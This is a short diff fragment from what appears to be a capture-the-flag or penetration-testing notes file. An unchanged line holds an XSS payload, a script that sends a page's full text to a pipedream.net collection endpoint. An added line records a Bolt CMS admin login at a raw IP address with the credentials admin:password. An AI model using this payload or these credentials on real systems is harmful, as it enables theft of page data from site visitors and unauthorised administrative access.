@@ -15,6 +15,8 @@
 5 manual-review <script> fetch('https://eoxmt8wpvlva3h2.m.pipedream.net?data='+document.body.innerText); </script>
 
 
+-6 bolt    http://34.159.151.77:31474/bolt/login admin:password
+
 
 
 
